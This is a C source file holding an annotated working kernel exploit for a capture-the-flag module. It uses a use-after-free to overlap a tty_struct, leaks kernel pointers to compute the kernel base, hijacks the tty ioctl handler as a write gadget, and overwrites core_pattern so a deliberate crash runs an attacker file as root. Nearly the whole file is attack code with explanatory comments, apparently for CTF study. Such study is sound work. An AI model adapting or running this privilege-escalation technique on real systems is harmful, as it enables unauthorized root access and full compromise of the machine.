/* This is an annotated version of the exploit script written by
 * https://github.com/Ninja3047 that achieves local privilege
 * escalation by using the use-after-free bug in the vulnerable
 * kernel module to overlap with a tty_struct and create an
 * arbitrary-address-write primitive that is used to overwrite
 * the /proc/sys/kernel/core_pattern variable.
 * */
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#define CTF_ALLOC 1337
#define CTF_FREE  1338
#define ALLOC_SIZE 0x2B8

// Hexdump for debugging
void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}


struct tty_struct;
struct tty_driver;
struct file;

struct tty_operations {
    void* data_pointer;
    int (*install)(struct tty_driver *, struct tty_struct *);
    void (*remove)(struct tty_driver *, struct tty_struct *);
    int (*open)(struct tty_struct *, struct file *);
    void (*close)(struct tty_struct *, struct file *);
    void (*shutdown)(struct tty_struct *);
    void (*cleanup)(struct tty_struct *);
    int (*write)(struct tty_struct *, const unsigned char *, int);
    int (*put_char)(struct tty_struct *, unsigned char);
    void (*flush_chars)(struct tty_struct *);
    int (*write_room)(struct tty_struct *);
    int (*chars_in_buffer)(struct tty_struct *);
    void (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg); // offset 0x60
    // rest don't matter
};

struct tty_struct {
    int magic;
    char _pad0[0x10];
    struct tty_operations *ops; // offset 0x18
    char _pad1[0x18];
    struct tty_operations my_ops;
    unsigned long rop_chain[20];
};


int main(int argc, char* argv[]) {
    unsigned long base = 0;
    printf("[+] Spraying pool\n");
    /* Spray tty_struct objects onto heap */
    for (int i = 0; i < 0x20; i++) {
        open("/dev/ptmx", O_RDWR);
    }

    printf("[+] Opening /dev/ctf\n");
    int fd = open("/dev/ctf", O_RDWR, 0);
    if (fd < 0) {
        perror("failed to open device");
        goto fail;
    }

    printf("[+] CTF_ALLOC %d \n", ALLOC_SIZE);
    /* Use the vulnerable kernel module to:
     * 1. Allocate
     * 2. Free
     * */
    ioctl(fd, CTF_ALLOC, (void*)ALLOC_SIZE);
    ioctl(fd, CTF_FREE);

    // Allocate a tty_struct object to overlap
    // where the recently freed object has been.
    int fdm = open("/dev/ptmx", O_RDWR);
    if (fdm < 0) {
        printf("[+] Could not open ptmx\n");
        goto fail;
    }
    
    char buf[ALLOC_SIZE];
    __builtin_memset(buf, 0, sizeof(buf));
    /* Perform a Use-After-Free read
     * to leak some pointers.
     * */
    size_t len = read(fd, buf, sizeof(buf));
    printf("[+] READ %lu\n", len);
    DumpHex(buf, sizeof(buf));

    struct tty_struct* tty_info = (struct tty_struct*)buf;
    printf("magic: %x\n", tty_info->magic);
    if (tty_info->magic == 0x5401) {
        printf("Leaked text pointer: %p\n", tty_info->ops);
        printf("Leaked data pointer: %p\n", tty_info->my_ops.data_pointer);
        // Compute kernel base address using text pointer leak.
        base = (unsigned long)tty_info->ops - 0x10745e0;
        printf("base: %lx\n", base);
    }

    tty_info->ops = tty_info->my_ops.data_pointer;
    // get rid of close handler
    tty_info->my_ops.close = (void*)0;
    // Prepare arbitrary-address-write gadget
#define MOV__RDX__RCX_RET base + 0x056db7
    tty_info->my_ops.ioctl = (void*)MOV__RDX__RCX_RET;

    len = write(fd, buf, sizeof(buf));
    printf("[+] WRITE %lu\n", len);

    getchar();
    printf("[+] OVERWRITING CORE_PATTERN\n");
#define CORE_PATTERN base + 0x155f7a0
    /* Use the kernel base to get the address to core_pattern.
     * core_pattern has a default value of core\x00 so search the vmlinux for a lone core\x00 string.
     * Don't forget to use the extract-vmlinux script on the bzImage first.
     * Reference: https://elixir.bootlin.com/linux/latest/source/fs/coredump.c#L57
     * */
    // Overwrite /proc/sys/kernel/core_pattern with "|/tmp/userdata/x"
    // This will execute /tmp/userdata/x with root-privileges.
    ioctl(fdm, 0x6d742f7c, CORE_PATTERN);      // '|/tm'
    ioctl(fdm, 0x73752f70, CORE_PATTERN + 4);  // 'p/us'
    ioctl(fdm, 0x61647265, CORE_PATTERN + 8);  // 'erda'
    ioctl(fdm, 0x782f6174, CORE_PATTERN + 12); // 'ta/x'
    getchar();
    printf("[+] BYEE\n");

fail:
    printf("[+] CRASHING\n");
    // Trigger the core_pattern by intentionally crashing the program
    // with a NULL pointer dereference.
    char * null_p = 0x00;
    *null_p = 0x69696969;

    // Alternatively, the ud2 instruction can be used to trigger a SIGILL.
    //asm("ud2");

    printf("[+] FAIL\n");
    exit(-1);
}

